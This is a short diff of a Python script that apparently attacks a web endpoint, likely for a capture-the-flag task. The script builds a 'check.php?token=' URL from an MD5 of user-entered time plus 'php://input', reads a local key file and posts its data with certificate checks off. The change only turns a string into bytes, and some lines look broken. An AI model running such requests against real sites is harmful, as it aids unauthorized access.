@@ -3,7 +3,7 @@ minute=hashlib.md5(input("输入时分"))
 url=input("输入网址")+"/check.php?token="+minute+"&php://input"
 with open("C:\\Users\\whb\\Downloads\\key (1).dat","rb")as f:
     data1=f.read()
-    data2="mmmmmmm"
+    data2=b"mmmmmmm"
 def func(data):
     reponse=requests.post(url=url,data=data,verify=False)
     with lock:
